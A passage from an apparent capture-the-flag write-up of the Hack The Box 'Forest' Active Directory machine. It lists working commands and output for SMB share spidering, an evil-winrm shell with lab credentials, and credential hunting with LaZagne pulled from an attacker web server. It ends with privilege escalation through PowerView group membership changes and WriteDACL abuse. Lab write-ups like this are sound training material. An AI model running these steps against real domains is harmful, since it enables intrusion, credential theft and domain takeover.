+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           [*] Enumerated shares
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           Share           Permissions     Remark
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           -----           -----------     ------
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           ADMIN$                          Remote Admin
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           C$                              Default share
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           IPC$                            Remote IPC
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           NETLOGON        READ            Logon server share 
+</span></span><span class=line><span class=cl>SMB         10.129.191.98   445    FOREST           SYSVOL          READ            Logon server share 
+</span></span></code></pre></td></tr></table></div></div><ul><li>We are in!</li></ul><ol start=2><li>Let&rsquo;s see what are in those shares</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.191.98 -u svc-alfresco -p s3rvice -M spider_plus -o <span class=nv>DOWNLOAD_FLAG</span><span class=o>=</span>True
+</span></span><span class=line><span class=cl>cat /tmp/nxc_hosted/nxc_spider_plus/10.129.191.98.json
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>DOWNLOAD_FLAG=True</code> will download all the files in the share.
+Output:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;NETLOGON&#34;</span><span class=p>:</span> <span class=p>{},</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;SYSVOL&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2021-08-30 20:45:24&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;22 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2021-08-30 20:45:23&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;1.07 KB&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-19 07:11:35&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;22 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-18 13:45:57&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2019-09-19 07:11:35&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;3.74 KB&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>  
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nothing interesting</li></ul><h2 id=winrm-as-svc-alfresco>WinRM as svc-alfresco</h2><ol><li>We can access WinRM</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec winrm 10.129.191.98 -u <span class=s1>&#39;svc-alfresco&#39;</span> -p <span class=s1>&#39;s3rvice&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>WINRM       10.129.191.98   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
+</span></span><span class=line><span class=cl>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+</span></span><span class=line><span class=cl>  arc4 = algorithms.ARC4(self._key)
+</span></span><span class=line><span class=cl>WINRM       10.129.191.98   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+</span></span></code></pre></td></tr></table></div></div><ul><li>Are we admin?</li></ul><ol start=2><li>To access winrm,</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>evil-winrm -i 10.129.191.98 -u <span class=s1>&#39;svc-alfresco&#39;</span> 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Enter Password: 
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami
+</span></span><span class=line><span class=cl>htb\svc-alfresco
+</span></span></code></pre></td></tr></table></div></div><h2 id=credential-hunting>Credential Hunting</h2><ol><li>cmdkey</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> cmdkey /list
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Currently stored credentials:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>* NONE *
+</span></span></code></pre></td></tr></table></div></div><ul><li>Future me: Cannot trust. Should manually check <code>C:\Users\&lt;name>\AppData</code></li></ul><ol start=2><li>Windows autologon</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+</span></span><span class=line><span class=cl>    AutoRestartShell    REG_DWORD    0x1
+</span></span><span class=line><span class=cl>    Background    REG_SZ    0 0 0
+</span></span><span class=line><span class=cl>    CachedLogonsCount    REG_SZ    10
+</span></span><span class=line><span class=cl>    DebugServerCommand    REG_SZ    no
+</span></span><span class=line><span class=cl>    DisableBackButton    REG_DWORD    0x1
+</span></span><span class=line><span class=cl>    ForceUnlockLogon    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    LegalNoticeCaption    REG_SZ
+</span></span><span class=line><span class=cl>    LegalNoticeText    REG_SZ
+</span></span><span class=line><span class=cl>    PasswordExpiryWarning    REG_DWORD    0x5
+</span></span><span class=line><span class=cl>    PowerdownAfterShutdown    REG_SZ    0
+</span></span><span class=line><span class=cl>    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+</span></span><span class=line><span class=cl>    ReportBootOk    REG_SZ    1
+</span></span><span class=line><span class=cl>    Shell    REG_SZ    explorer.exe
+</span></span><span class=line><span class=cl>    ShellCritical    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    ShellInfrastructure    REG_SZ    sihost.exe
+</span></span><span class=line><span class=cl>    SiHostCritical    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    SiHostReadyTimeOut    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    SiHostRestartCountLimit    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    SiHostRestartTimeGap    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+</span></span><span class=line><span class=cl>    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+</span></span><span class=line><span class=cl>    WinStationsDisabled    REG_SZ    0
+</span></span><span class=line><span class=cl>    scremoveoption    REG_SZ    0
+</span></span><span class=line><span class=cl>    DisableCAD    REG_DWORD    0x1
+</span></span><span class=line><span class=cl>    LastLogOffEndTimePerfCounter    REG_QWORD    0x5ea4c0cd
+</span></span><span class=line><span class=cl>    ShutdownFlags    REG_DWORD    0x80000033
+</span></span><span class=line><span class=cl>    DisableLockWorkstation    REG_DWORD    0x0
+</span></span><span class=line><span class=cl>    DefaultDomainName    REG_SZ    HTB
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Lazagne</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>iwr -Uri <span class=s2>&#34;http://10.10.16.26:8000/LaZagne.exe&#34;</span> -OutFile <span class=s2>&#34;C:\users\svc-alfresco\LaZagne.exe&#34;</span>
+</span></span><span class=line><span class=cl>./LaZagne.exe all 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>|====================================================================|
+</span></span><span class=line><span class=cl>|                                                                    |
+</span></span><span class=line><span class=cl>|                        The LaZagne Project                         |
+</span></span><span class=line><span class=cl>|                                                                    |
+</span></span><span class=line><span class=cl>|                          ! BANG BANG !                             |
+</span></span><span class=line><span class=cl>|                                                                    |
+</span></span><span class=line><span class=cl>|====================================================================|
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[+] 0 passwords have been found.
+</span></span><span class=line><span class=cl>For more information launch it again with the -v option
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>elapsed time = 0.015625953674316406
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><ol><li>My privileges</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>whoami /priv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
+</span></span><span class=line><span class=cl>----------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Privilege Name                Description                    State
+</span></span><span class=line><span class=cl>============================= ============================== =======
+</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Groups</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>whoami /groups
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GROUP INFORMATION
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Group Name                                 Type             SID                                           Attributes
+</span></span><span class=line><span class=cl>========================================== ================ ============================================= ==================================================
+</span></span><span class=line><span class=cl>Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>No Kerberoastable users</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetUserSPNs -dc-ip forest.htb.local -dc-host forest.htb.local htb.local/svc-alfresco
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>No entries found!
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Bloodhound
+![[Pasted image 20260131112557.png]]<ul><li>Alright interesting. We have <code>GenericAll</code> over <code>Exchange Windows Permissions</code>, so we can add ourselves into the group.</li><li><code>Exchange Windows Permissions</code> has <code>WriteDACL</code> over the domain object, so we can have full control over the domain</li></ul></li><li>Let&rsquo;s add ourselves to <code>Exchange Windows Permissions</code>
+Download and transfer powerview</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 
+</span></span><span class=line><span class=cl>python3 -m http.server
+</span></span></code></pre></td></tr></table></div></div><p>Download the file and execute it</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>iwr </span><span class=n>-Uri</span> <span class=s2>&#34;http://10.10.16.26:8000/PowerView.ps1&#34;</span> <span class=n>-OutFile</span> <span class=s2>&#34;C:\users\svc-alfresco\PowerView.ps1&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=p>.\</span><span class=n>PowerView</span><span class=p>.</span><span class=py>ps1</span>
+</span></span></code></pre></td></tr></table></div></div><p>Then, add ourselves to the group. We need to use <code>-Credentials</code> because we are not in an interactive shell I think.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$user1</span><span class=p>=</span><span class=s1>&#39;htb\svc-alfresco&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>$SecPassword</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s1>&#39;s3rvice&#39;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span>
+</span></span><span class=line><span class=cl><span class=nv>$Cred</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PSCredential</span><span class=p>(</span><span class=nv>$user1</span><span class=p>,</span> <span class=nv>$SecPassword</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$targetGroup</span><span class=p>=</span><span class=s1>&#39;Exchange Windows Permissions&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>$newUser</span><span class=p>=</span><span class=s1>&#39;svc-alfresco&#39;</span>
+</span></span><span class=line><span class=cl><span class=nb>Add-DomainGroupMember</span> <span class=n>-Identity</span> <span class=nv>$targetGroup</span> <span class=n>-Members</span> <span class=nv>$newUser</span> <span class=n>-Credential</span> <span class=nv>$Cred</span> <span class=n>-Verbose</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-DomainGroupMember</span> <span class=n>-Identity</span> <span class=s2>&#34;Exchange Windows Permissions&#34;</span> <span class=p>|</span> <span class=nb>Select </span><span class=n>MemberName</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>MemberName</span>
+</span></span><span class=line><span class=cl><span class=p>----------</span>
+</span></span><span class=line><span class=cl><span class=nb>svc-alfresco</span>
+</span></span><span class=line><span class=cl><span class=n>Exchange</span> <span class=n>Trusted</span> <span class=n>Subsystem</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>With <a class=link href=https://bloodhound.specterops.io/resources/edges/write-dacl#abuse-info target=_blank rel=noopener><code>WriteDacl</code></a> privileges over the domain object, we can grant ourselves full control over the domain</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Add-DomainObjectAcl</span> <span class=n>-TargetIdentity</span> <span class=n>htb</span><span class=p>.</span><span class=py>local</span> <span class=n>-Rights</span> <span class=n>All</span>
+</span></span></code></pre></td></tr></table></div></div><p>To verify,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$sid</span><span class=p>=</span><span class=nb>Get-DomainUser</span> <span class=n>-Identity</span> <span class=nb>svc-alfresco</span> <span class=p>|</span> <span class=nb>Select </span><span class=n>-ExpandProperty</span> <span class=n>objectsid</span>
+</span></span><span class=line><span class=cl><span class=c># Get ACL</span>
+</span></span><span class=line><span class=cl><span class=nb>Get-ObjectAcl</span> <span class=s2>&#34;DC=htb,DC=local&#34;</span> <span class=n>-ResolveGUIDs</span> <span class=p>|</span> <span class=p>?</span> <span class=p>{</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>ObjectAceType</span> <span class=o>-match</span> <span class=s1>&#39;Replication-Get&#39;</span><span class=p>)}</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>SecurityIdentifier</span> <span class=o>-match</span> <span class=nv>$sid</span><span class=p>}</span> <span class=p>|</span><span class=nb>select </span><span class=n>AceQualifier</span><span class=p>,</span> <span class=n>ObjectDN</span><span class=p>,</span> <span class=n>ActiveDirectoryRights</span><span class=p>,</span><span class=n>SecurityIdentifier</span><span class=p>,</span><span class=n>ObjectAceType</span> <span class=p>|</span> <span class=nb>fl
+</span></span></span></code></pre></td></tr></table></div></div><ul><li>Does not work</li></ul><ol start=7><li>But this one does: <a class=link href=https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md target=_blank rel=noopener>https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
